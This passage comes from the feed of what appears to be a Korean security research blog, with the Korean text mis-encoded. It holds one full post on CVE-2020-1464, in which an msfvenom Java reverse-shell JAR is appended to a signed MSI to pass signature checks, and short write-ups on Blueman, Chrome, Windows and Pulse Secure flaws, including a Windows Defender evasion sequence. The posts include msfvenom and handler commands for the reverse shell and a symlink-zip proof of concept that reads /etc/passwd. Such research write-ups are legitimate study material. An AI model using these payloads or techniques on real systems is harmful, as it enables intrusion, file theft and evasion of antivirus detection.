ì¸ì¦ì„œë¼ê³  íŒë‹¨í•˜ê²Œ ë˜ê³ , ê³µê²©ìëŠ” ì´ë¥¼ ì´ìš©í•´ ì¸ì¦ì„œ ê²€ì¦ì„ ìš°íšŒí•˜ê³  malicious íŒŒì¼ì„ ì‹¤í–‰í•˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h2 id="JAR-Java-Archive"><a href="#JAR-Java-Archive" class="headerlink" title="JAR(Java Archive)"></a>JAR(Java Archive)</h2><p><img src="/2020/11/01/l0ch/cve-2020-1464/img5.webp"></p><p>JARì€ ìë°” í”Œë«í¼ ë°°í¬ë¥¼ ìœ„í•œ íŒ¨í‚¤ì§€ íŒŒì¼ í¬ë§·ì…ë‹ˆë‹¤.<br>íŠ¹ì§•ìœ¼ë¡œëŠ” zip í¬ë§·ìœ¼ë¡œ ë¹Œë“œë˜ì–´ ìë°” ëŸ°íƒ€ì„ì—ì„œ ë¡œë“œë  ë•Œ íŒŒì¼ì˜ ëì—ì„œë¶€í„° ë¡œë“œë©ë‹ˆë‹¤.</p><p>â†’ íŒŒì¼ ì•ì— ì„ì˜ì˜ ë°ì´í„°ê°€ ìˆì–´ë„ ì •ìƒ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>ìŠ¬ìŠ¬ ê°ì´ ì˜¬ë½ ë§ë½ í•˜ì£ ??</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>ì•ì„œ ë‚˜ì˜¨ ì·¨ì•½ì ê³¼ JAR íŒŒì¼ì˜ íŠ¹ì„±ì„ ì¡°í•©í•˜ë©´..?</p><p><strong>MSI íŒŒì¼ ëì— ì„ì˜ ë°ì´í„°ê°€ ì™€ë„ ìœ íš¨í•œ ì¸ì¦ì„œê°€ ë˜ëŠ” ì·¨ì•½ì  + íŒŒì¼ ì•ì— ì„ì˜ì˜ ë°ì´í„°ê°€ ìˆì–´ë„ ì •ìƒ ì‹¤í–‰ë˜ëŠ” jar</strong></p><p>ì¶•í•˜í•©ë‹ˆë‹¤! ìµìŠ¤í”Œë¡œì‡ ì‹œë‚˜ë¦¬ì˜¤ê°€ ì™„ì„±ë˜ì—ˆìŠµë‹ˆë‹¤!</p><p>ê·¸ë¦¼ìœ¼ë¡œ ì •ë¦¬í•˜ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img6.png" alt="ì¶œì²˜:https://www.securityinbits.com/malware-analysis/interesting-tactic-by-ratty-adwind-distribution-of-jar-appended-to-signed-msi/"></p><p>ë§ŒëŠ¥ ë©”íƒ€ìŠ¤í”Œë¡œì‡ìœ¼ë¡œ ë¦¬ë²„ìŠ¤ ì‰˜ malicious íŒŒì¼ì„ ìƒì„±í•´ì„œ ìµìŠ¤ë¥¼ í•´ë³¼ê²Œìš”.</p><p>msfvenomìœ¼ë¡œ ë¦¬ë²„ìŠ¤ ì‰˜ì„ ì—¬ëŠ” jarí¬ë§·ì˜  malicious íŒŒì¼ì„ ìƒì„±í•©ë‹ˆë‹¤.</p><pre><code class="hljs markdown">msfvenom -p java/meterpreter/revserse<span class="hljs-emphasis">_https LHOST=[HOST IP] -f jar -o [filename].jar</span></code></pre><p><img src="/2020/11/01/l0ch/cve-2020-1464/img7.png"></p><p>ë¦¬ìŠ¤ë„ˆë„ ë¯¸ë¦¬ ì—´ì–´ë‘ê² ìŠµë‹ˆë‹¤.</p><pre><code class="hljs markdown">handler -p java/meterpreter/reverse<span class="hljs-emphasis">_https -H 0.0.0.0 </span></code></pre><p><img src="/2020/11/01/l0ch/cve-2020-1464/img8.png"></p><p>ìƒì„±ëœ jar íŒŒì¼ê³¼ í¬ë¡¬ ì„¤ì¹˜ msi íŒŒì¼ì„ í•©ì¹©ë‹ˆë‹¤. ì´ë•Œ ê¼­ msiíŒŒì¼ ë’¤ì— jar íŒŒì¼ì´ ì˜¤ë„ë¡ ìˆœì„œë¥¼ ì§€ì¼œì•¼ í•œë‹¤ëŠ” ì !</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img9.png"></p><p>ì´ì œ ìƒì„±ëœ exploit.jar ì—ì„œ ì¸ì¦ì„œê°€ ìœ íš¨í•œì§€ í™•ì¸í•´ë³´ë©´</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img10.png"></p><p>ìš”ë ‡ê²Œ ìœ íš¨í•œ ì¸ì¦ì„œë¡œ ë‚˜ì˜¤ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><p>ì‹¤í–‰ì„ í•´ë³´ë©´ í”¼í•´ PCì—ì„œëŠ” ì•„ë¬´ ë°˜ì‘ë„ ì—†ì§€ë§Œ, í”„ë¡œì„¸ìŠ¤ì—ì„œëŠ” ìë°”ê°€ ëŒì•„ê°€ê³  ìˆê³ </p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img11.png"></p><p>ìœ„ ì‚¬ì§„ê³¼ ê°™ì´ ë¦¬ë²„ìŠ¤ ì‰˜ì´ ì •ìƒì ìœ¼ë¡œ ë™ì‘í•˜ëŠ” ê±¸ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤!</p><h2 id="Patch-diffing"><a href="#Patch-diffing" class="headerlink" title="Patch diffing"></a>Patch diffing</h2><p>MSëŠ” ì´ì— ëŒ€í•œ íŒ¨ì¹˜ë¥¼ ë‚´ë†¨ëŠ”ë°ìš”, ì–´ë–»ê²Œ íŒ¨ì¹˜ë¥¼ í–ˆëŠ”ì§€ íŒ¨ì¹˜ ì´í›„ì˜ msisip.dllë¥¼ êµ¬í•´ ë¹„êµí•´ë³´ê² ìŠµë‹ˆë‹¤.</p><blockquote><p>ğŸ’¡ì£¼ì˜! ê¸€ì“´ì´ì˜ ì‚½ì§ˆì´ ë‹´ê²¨ ìˆìŠµë‹ˆë‹¤.</p></blockquote><p>ì•Šì´ ê·¼ë°.. ì´ê±° ìµìŠ¤í•˜ê³  ê¸€ ì¢€ ì“°ê³  ë””í•‘ í•˜ë ¤ê³  ë³´ë‹ˆê¹Œ ê·¸ìƒˆ ìœˆë„ìš°ê°€ ì—…ë°ì´íŠ¸ë¥¼ í•´ë²„ë ¸ë„¤..?</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img12.jpg"></p><p>ì•„ ** </p><ul><li>ìë™ ì—…ë°ì´íŠ¸ ì•ˆ ë”</li><li>ìŠ¤ëƒ…ìƒ· ì•ˆ ë§Œë“¤ì–´ë†“ìŒ</li></ul><p>â†’ íŒ¨ì¹˜ ì „ì˜ msisip.dll ëª» êµ¬í•¨ â†’ ?????????</p><p>ìœˆë„ìš° ì›ë°ì´ ë¶„ì„í•  ë• ìë™ ì—…ë°ì´íŠ¸ëŠ” ê¼­ ë„ë„ë¡ í•´ìš”â€¦â€¦. ì•„ë‹ˆë©´ ìŠ¤ëƒ…ìƒ·ì´ë¼ë„â€¦</p><p>íŒ¨ì¹˜ ì „ì˜ msisip.dllì„ ì–´ë–»ê²Œ êµ¬í•˜ì§€? ì–´ë–»ê²Œ êµ¬í•˜ê¸´ ì¡°ì§„ ê±°ì§€ ã…‹ã…‹</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img13.png"></p><p>ì—¿ê°™ì€ ìë™ ì—…ë°ì´íŠ¸ ë•ë¶„ì— ë˜ì§ˆ ë»”í–ˆì§€ë§Œ..^^<br>ê²°êµ­ idiothí˜• vmì— íŒ¨ì¹˜ ì „ íŒŒì¼ì´ ìˆì–´ì„œ ê·¸ê±° êµ¬ê±¸í•´ì„œ ë””í•‘ í•´ë²„ë ¸ì§€ìš”. íŒ€ì¥ë‹˜ ìµœê³  ~<br>ë„˜ê²¨ì£¼ëŠ” ëŒ€ì‹  ë¦¬ì œë¡œ ì •ì£¼í–‰ í•˜ë¼ëŠ” í˜‘ë°•ì€ ëª» ë“¤ì€ ê±¸ë¡œ í•˜ê² ìŠµë‹ˆë‹¤; </p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img14.png"></p><p>íšŒìƒ‰ ë…¸ë“œëŠ” ìƒˆë¡œ ì¶”ê°€ëœ ì½”ë“œ, ë…¸ë€ìƒ‰ ë…¸ë“œëŠ” ë³€ê²½ëœ ë…¸ë“œì…ë‹ˆë‹¤.</p><p><img src="/2020/11/01/l0ch/cve-2020-1464/img15.png"></p><p>íšŒìƒ‰ ë…¸ë“œë¥¼ ë³´ë©´ <code>MsiSIPVerifyIndirectData()</code> í•¨ìˆ˜ì—ì„œ <code>NeedFileSizeVerification()</code> ê³¼ <code>VerifyFileSize()</code> ë¥¼ í˜¸ì¶œí•˜ëŠ” ì½”ë“œê°€ ì¶”ê°€ëœ ê²ƒì„ ë³´ì•„ MSI íŒŒì¼ì˜ ì‚¬ì´ì¦ˆë¥¼ í™•ì¸í•˜ëŠ” ì½”ë“œë¥¼ ì¶”ê°€í•´ ì·¨ì•½ì  íŒ¨ì¹˜ë¥¼ í•œ ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì  ë¶„ì„ì´ë‘ ìµìŠ¤ í•˜ëŠ” ê²ƒë³´ë‹¤ ë””í•‘ í•˜ëŠ”ë° ì‹œê°„ì„ í›¨ì”¬ ë§ì´ ì¼ë„¤ìš”â€¦^^ ì´  ê³¼ì •ì„ ê°œì„ í•  ì—¬ì§€ê°€ ìˆì„ ê²ƒ ê°™ì•„ ë‹¤ìŒ ê¸€ì€ ë””í•‘ê³¼ ê´€ë ¨ëœ ì—°êµ¬ ì£¼ì œ ì¼ ê²ƒ ê°™ìŠµë‹ˆë‹¤.  ì´ê±° í•˜ëŠë¼ ìœˆë„ìš° vmë§Œ 5ê°œ ë§Œë“  ê±´ ì•ˆ ë¹„ë°€ ^.^ </p><p>ê·¸ëŸ¼ ë‹¤ìŒ ê¸€ë¡œ ëŒì•„ì˜¬ê²Œìš” ì•ˆë…•!</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>msi</tag>
      
      <tag>L0ch</tag>
      
      <tag>code signing certificate</tag>
      
      <tag>jar</tag>
      
      <tag>glueball</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-15238: Blueman argument injection</title>
    <link href="/2020/10/31/fabu1ous/2020-10-31/"/>
    <url>/2020/10/31/fabu1ous/2020-10-31/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.exploit-db.com/exploits/48963">Blueman &lt; 2.1.4 - Local Privilege Escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Blueman 2.1.4 ì´ì „ ë²„ì „</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>D-bus(Desktop-bus)ëŠ” IPC í˜¹ì€ RPC ë©”ì»¤ë‹ˆì¦˜ì…ë‹ˆë‹¤. D-busì˜ DHCPClient ë©”ì†Œë“œì™€ Blueman ì‚¬ì´ì— arguments sanitizing ê³¼ì •ì´ ì—†ì–´ argument injectionì´ ë°œìƒí•˜ê³ , ì‹œìŠ¤í…œ êµ¬ì„±ì— ë”°ë¼ impactê°€ 2ê°€ì§€ë¡œ ë‚˜ë‰©ë‹ˆë‹¤. </p><pre><code class="hljs routeros">1. isc-dhcp-client ì‚¬ìš© ì‹œ<span class="hljs-built_in">ip </span>ëª…ë ¹ì–´ì— argument injection, ì¸í„°í˜ì´ìŠ¤ë¥¼ ì¢…ë£Œí•˜ëŠ” Dos2. dhcpd package ì‚¬ìš© ì‹œ<span class="hljs-string">&quot;-c/arbitrary_script_path&quot;</span>ì˜µì…˜ì„ ì‚¬ìš©í•´ ì„ì˜ì˜ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰</code></pre><p>ëŒ€ë¶€ë¶„ì˜  D-bus ì¸í„°í˜ì´ìŠ¤ëŠ” PolicyKitìœ¼ë¡œ Authenticationì„ ê±°ì¹˜ì§€ë§Œ Blueman 2.0.6 ì´ì „ ë²„ì „ì€ Polkit-1ì´ ê¸°ë³¸ì ìœ¼ë¡œ ë¹„í™œì„±í™”ë˜ì–´ìˆì–´, ëª¨ë“  ë¡œì»¬ ìœ ì €ê°€ ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.eyecontrol.nl/blog/the-story-of-3-cves-in-ubuntu-desktop.html">https://www.eyecontrol.nl/blog/the-story-of-3-cves-in-ubuntu-desktop.html</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>linux</tag>
      
      <tag>blueman</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-6449: Exploiting a textbook use-after-free in Chrome</title>
    <link href="/2020/10/30/l0ch/10-30_1day1line/"/>
    <url>/2020/10/30/l0ch/10-30_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/research/CVE-2020-6449-exploit-chrome-uaf">Exploiting a textbook use-after-free in Chrome</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Chrome version: master branch build 79956ba, asan build 80.3987.132 Operating System: Ubuntu 18.04</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2020-6449ëŠ” Chromeì—ì„œ ì‚¬ìš©í•˜ëŠ” blink ì—”ì§„ì˜ <code>WebAudio</code> ëª¨ë“ˆì—ì„œ ë°œìƒí•˜ëŠ” Use-After-Free ì·¨ì•½ì  ì…ë‹ˆë‹¤. </p><p>ì·¨ì•½ì ì€ <code>DeferredTaskHandler::BreakConnections</code> ì—ì„œ ë°œìƒí•©ë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ <code>active_source_handlers_</code>ëŠ” <code>finished_source_handlers_</code> ì˜ ì›ì‹œ í¬ì¸í„°ë¥¼ í™œì„± ìƒíƒœë¡œ ìœ ì§€í•˜ëŠ” ì—­í• ì„ í•˜ë©° ì‚¬ìš©ì´ ì™„ë£Œëœ ì´í›„ì—ëŠ” í• ë‹¹ëœ <code>active_source_handlers_</code> ì™€ <code>finished_source_handlers_</code> ê°€ ê°™ì´ freeë˜ì–´ì•¼ í•©ë‹ˆë‹¤.</p><p>ê·¸ëŸ¬ë‚˜ ì»¨í…ìŠ¤íŠ¸ë¥¼ ì‚­ì œí•˜ì—¬ <code>BaseAudioContext::Uninitialize</code> ê°€ ì‹¤í–‰ëœ ì´í›„ <code>DeferredTaskHandler::ClearHandlersToBeDeleted</code> ë¥¼ í˜¸ì¶œí•˜ë©´ <code>active_source_handlers_</code> ë§Œ freeë˜ê³  <code>finished_source_handlers_</code> ì— freeëœ í¬ì¸í„°ê°€ ë‚¨ê²Œ ë©ë‹ˆë‹¤. ì´í›„ <code>DeferredTaskHandler::BreakConnections</code> ë¥¼ í˜¸ì¶œí•´ UAF ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://securitylab.github.com/research/garbage-collection-uaf-chrome_gc">https://securitylab.github.com/research/garbage-collection-uaf-chrome_gc</a></p><p><a href="https://securitylab.github.com/advisories/GHSL-2020-040-chrome">https://securitylab.github.com/advisories/GHSL-2020-040-chrome</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>use after free</tag>
      
      <tag>chrome</tag>
      
      <tag>L0ch</tag>
      
      <tag>chromium</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-16939: Windows Group Policy DACL overwriteë¥¼ ì´ìš©í•œ ê¶Œí•œ ìƒìŠ¹</title>
    <link href="/2020/10/29/idioth/2020-10-29/"/>
    <url>/2020/10/29/idioth/2020-10-29/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/10/27/cve-2020-16939-windows-group-policy-dacl-overwrite-privilege-escalation">CVE-2020-16939: WINDOWS GROUP POLICY DACL OVERWRITE PRIVILEGE ESCALATION</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>í•´ë‹¹ ì·¨ì•½ì ì€ ê·¸ë£¹ ì •ì±… ì—…ë°ì´íŠ¸ ì‹¤í–‰ ì¤‘ì— ìˆ˜í–‰ë˜ëŠ”  <code>SetSecurityFile</code>ì„ ì•…ìš©í•˜ëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤.</p><p><code>gpupdate /target:user /force</code> ì‹¤í–‰ ì‹œ <code>SetSecurityFile</code>ëŠ” impersonation ì—†ì´ ìˆ˜í–‰ë©ë‹ˆë‹¤. ê·¸ë£¹ ì •ì±… ì—…ë°ì´íŠ¸ê°€ ì‹¤í–‰ëœ í›„ <code>%programdata%\Microsoft\GroupPolicy\Users\&lt;SID&gt;</code>ì˜ ì†Œìœ ìëŠ” Administratorsê°€ ë˜ê³  User ê·¸ë£¹ì€ ì½ê¸° ë° ì‹¤í–‰ ê¶Œí•œë§Œ ê°–ê²Œ ë©ë‹ˆë‹¤. í•˜ì§€ë§Œ í•˜ìœ„ ë””ë ‰í„°ë¦¬ì¸ <code>\Datastore\0\sysvol</code>ì˜ ì†Œìœ ìëŠ” Userê°€ ë©ë‹ˆë‹¤. ë”°ë¼ì„œ ê¶Œí•œì´ ë‚®ë”ë¼ë„ í•´ë‹¹ í´ë”ì˜ ê¶Œí•œì„ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><code>sysvol</code> ë””ë ‰í„°ë¦¬ ì•„ë˜ì— ê¶Œí•œì„ ìˆ˜ì •í•  ë””ë ‰í„°ë¦¬ì˜ Junctionì„ ìƒì„±í•œ í›„ ê·¸ë£¹ ì •ì±… ì—…ë°ì´íŠ¸ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. í•´ë‹¹ í´ë”ì™€ í´ë” ë‚´ì˜ íŒŒì¼ë“¤ì€ ëª¨ë‘ DACL Writeì˜ ëŒ€ìƒì´ ë˜ë©°  DACL Write ì¤‘ ì—ëŸ¬ê°€ ë°œìƒí•˜ë©´ ìˆ˜ì •í•œ ê¶Œí•œì´ ë¶€ì—¬ë©ë‹ˆë‹¤. ì—ëŸ¬ê°€ ë°œìƒí•˜ê²Œ í•˜ëŠ” ë°©ë²• ì¤‘ í•˜ë‚˜ëŠ” DACL Writeê°€ ì™„ë£Œë˜ê¸° ì „ì— <a href="https://docs.microsoft.com/en-us/windows/win32/fileio/opportunistic-locks">oplock</a>ì„ ì‚¬ìš©í•˜ì—¬ juctionì„ ì‚­ì œí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>idioth</tag>
      
      <tag>dacl</tag>
      
      <tag>group policy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Process Herpaderping</title>
    <link href="/2020/10/28/fabu1ous/2020-10-28/"/>
    <url>/2020/10/28/fabu1ous/2020-10-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://jxy-s.github.io/herpaderping/">Process Herpaderping</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p><strong>OS</strong></p><ul><li>Windows 7 Enterprise x86</li><li>windows 10 Pro x64</li><li>Windows 10 Pro Insider Preview x64</li></ul><p><strong>Security Prodct</strong></p><ul><li>Windows Defender AntiMalware Client</li><li>Windows Defender Engine</li><li>Windows Defender Antivirus</li><li>Windows Defender Antispyware</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><code>Herpaderping</code>ì´ë¼ëŠ” Detection Evasion ê¸°ìˆ ì…ë‹ˆë‹¤. ë””ìŠ¤í¬ì— ì¡´ì¬í•˜ëŠ” ì‹¤í–‰íŒŒì¼ì„ Process objectì˜ ìƒì„±ê³¼ Initial Thread ì‚½ì… ê³¼ì • ì‚¬ì´ì—ì„œ ìˆ˜ì •í•˜ëŠ” íƒì§€ ìš°íšŒ ë°©ë²•ì´ ì¡´ì¬í•©ë‹ˆë‹¤. ì´ë¥¼ ë°©ì§€í•˜ê³ ì íŒŒì¼ì— write ì‘ì—…ì´ ìˆì—ˆëŠ”ì§€ í™•ì¸í•˜ëŠ” <code>on-write scanning</code>ì´ ë„ì…ëìŠµë‹ˆë‹¤. ë¬¸ì œëŠ” ì´ <code>on-write scanning</code>ì´ <code>IRP_MJ_CLEANUP</code>(== file handle close)ì´ ë°œìƒí•˜ê¸° ì „ê¹Œì§€ íŒŒì¼ì˜ ìˆ˜ì • ì—¬ë¶€ë¥¼ ê²€ì‚¬í•˜ì§€ ì•ŠëŠ”ë‹¤ëŠ” ê²ë‹ˆë‹¤. ë”°ë¼ì„œ ì•„ë˜ì™€ ê°™ì€ ìˆœì„œë¡œ ìš°íšŒê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><pre><code class="hljs angelscript"><span class="hljs-number">1.</span> CreateFile (File handleì„ ê³„ì† ì—´ì–´ë†“ëŠ”ë‹¤.)<span class="hljs-number">2.</span> NtCreateSectioin<span class="hljs-number">3.</span> NtCreatePrcessex<span class="hljs-number">4.</span> ì‹¤í–‰íŒŒì¼ ìˆ˜ì •<span class="hljs-number">5.</span> NtCreateThreadEx<span class="hljs-number">6.</span> CloseFile (IRP_MJ_ClEANUP)</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windows</tag>
      
      <tag>detection evasion</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Technical Advisory: Pulse Connect Secure â€“ Arbitrary File Read via Logon Message</title>
    <link href="/2020/10/27/l0ch/10-27_1day1line/"/>
    <url>/2020/10/27/l0ch/10-27_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://research.nccgroup.com/2020/10/26/technical-advisory-pulse-connect-secure-arbitrary-file-read-via-logon-message-cve-2020-8255/">Technical Advisory: Pulse Connect Secure â€“ Arbitrary File Read via Logon Message (CVE-2020-8255)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Pulse Connect Secure</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>SSL VPN ì„œë¹„ìŠ¤ì¸ Pulse Connect Secureì—ì„œ ë¡œê·¸ì˜¨ ë©”ì‹œì§€ êµ¬ì„± ìš”ì†Œë¥¼ ì•…ìš©í•´ arbitrary file readê°€ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ê´€ë¦¬ìëŠ” ë¡œê·¸ì¸ ì‹œ ì¶œë ¥ë˜ëŠ” ë©”ì‹œì§€ë¥¼ <code>/dana-admin/auth/signinNotf.cgi</code> í˜ì´ì§€ë¥¼ í†µí•´ ì„¤ì •í•  ìˆ˜ ìˆëŠ”ë°, <code>en.txt</code> ë° <code>default.txt</code> íŒŒì¼ë¡œ êµ¬ì„±ëœ zip í˜•ì‹ì˜ íŒŒì¼ì„ ì—…ë¡œë“œí•˜ë©´ í•´ë‹¹ íŒŒì¼ì˜ ë‚´ìš©ì´ ë¡œê·¸ì˜¨ ë©”ì‹œì§€ë¡œ í‘œì‹œë©ë‹ˆë‹¤.</p><p>ì´ë•Œ zip íŒŒì¼ì— í¬í•¨ëœ íŒŒì¼ì˜ ì‹¬ë³¼ë¦­ ë§í¬ ì—¬ë¶€ë¥¼ í™•ì¸í•˜ì§€ ì•Šìœ¼ë©° read í•  íŒŒì¼ì„ ì‹¬ë³¼ë¦­ ë§í¬ë¡œ ì„¤ì •í•˜ëŠ” arbitrary file readê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>ë‹¤ìŒì€ <code>/etc/passwd</code> íŒŒì¼ì„ ì¶œë ¥í•˜ëŠ” POCì…ë‹ˆë‹¤.</p><pre><code class="hljs gradle">ln -s <span class="hljs-regexp">/etc/</span>passwd <span class="hljs-keyword">default</span>.txtln -s <span class="hljs-regexp">/etc/</span>passwd en.txtzip --symlinks logon.zip <span class="hljs-keyword">default</span>.txt en.txtadding: <span class="hljs-keyword">default</span>.txt (stored <span class="hljs-number">0</span>%)adding: en.txt (stored <span class="hljs-number">0</span>%)</code></pre><p>ìœ„ì™€ ê°™ì´ íŒŒì¼ì— ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ì„¤ì •í•´ zipìœ¼ë¡œ ì••ì¶•í•œ ë’¤ <code>/dana-admin/auth/signinNotf.cgi</code> í˜ì´ì§€ì— ì—…ë¡œë“œí•˜ë©´ ë¡œê·¸ì˜¨ í˜ì´ì§€ì— <code>/etc/passwd</code>ì˜ ë‚´ìš©ì´ í‘œì‹œë©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file read</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-1034: Windows Kernel EoP</title>
    <link href="/2020/10/26/idioth/cve-2020-1034/"/>
    <url>/2020/10/26/idioth/cve-2020-1034/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.br0vvnn.io/pages/blogpost.aspx?id=2">Explicit Is Always Good? Read the Story of CVE-2020-1034</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 8</li><li>Windows 10</li><li>Windows Server 2012</li><li>Windows Server 2019</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì§€ë‚œ 9ì›” ì»¤ë„ ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì ì— ëŒ€í•œ íŒ¨ì¹˜ê°€ í¬í•¨ë˜ì—ˆìŠµë‹ˆë‹¤. í•´ë‹¹ íŒ¨ì¹˜ì— ì˜í–¥ì„ ë°›ëŠ” ëª¨ë“ˆì€ <code>ntoskrnl.exe</code>ì…ë‹ˆë‹¤.</p><p><code>EtwpNotifyGuid</code>ì—ì„œ <code>cmp [rdi+0Ch], r12b</code>ë¥¼ ìˆ˜í–‰í•˜ëŠ”ë° <code>r12b</code>ì˜ ì´ˆê¸°í™” ê°’ì€ 4ì´ì§€ë§Œ 1ë¡œ ë¦¬ì…‹ì´ ë©ë‹ˆë‹¤. <code>byte ptr[rdi+0Ch]</code>ê°€ 1ì˜ ê°’ê³¼ ê°™ë‹¤ë©´ <code>rdi+18h</code> ê°’ì€ ìƒˆë¡œ ìƒì„±ëœ <code>UmReplyObject</code>ì˜ ì£¼ì†Œë¡œ ì„¤ì •ë©ë‹ˆë‹¤. <code>twpQueueNotification</code>ì—ì„œ <code>UmReplyObject</code>ê°€ ì°¸ì¡°ëœ ë¶€ë¶„ì„ ì°¾ìœ¼ë©´ <code>bl</code>ì˜ ê°’ì€ 0ì´ê³  <code>rbp+0Ch</code>ê°€ 0ì´ ì•„ë‹ ì‹œ <code>rbp+18h</code>ëŠ” ê°ì²´ì˜ í¬ì¸í„°ë¥¼ ì½ìŠµë‹ˆë‹¤. </p><p><code>rbp+0Ch</code>ëŠ”  <code>EtwpNotifyGuid</code>ì—ì„œëŠ” 1ê³¼ ë¹„êµí•˜ì—¬ <code>UmReplyObject</code>ë¥¼ ë§Œë“¤ì§€ ì—¬ë¶€ë¥¼ ê²°ì •í•˜ì§€ë§Œ ë§ˆì§€ë§‰ ë¹„êµì—ì„œ 0ê³¼ ë¹„êµí•˜ì—¬ ì¼ê´€ì„± ì—†ëŠ” ë¹„êµê°€ ë©ë‹ˆë‹¤.</p><p>ë§Œì•½ ë¹„êµí•œ ê°’ì´ 1ì´ë‚˜ 0ì´ ì•„ë‹ ê²½ìš° ê°ì²´ ì£¼ì†Œê°€ ì„ì˜ì˜ ê°’ìœ¼ë¡œ ì‚¬ìš©ë˜ê³  <code>ObfReferenceObject</code>ê°€ í˜¸ì¶œë˜ì–´ <code>ptr[[InputBuffer + 0x18]-0x30] ++</code>ì—°ì‚°ì´ ìˆ˜í–‰ë˜ì–´ ì„ì˜ ì£¼ì†Œ ì¦ê°€ê°€ 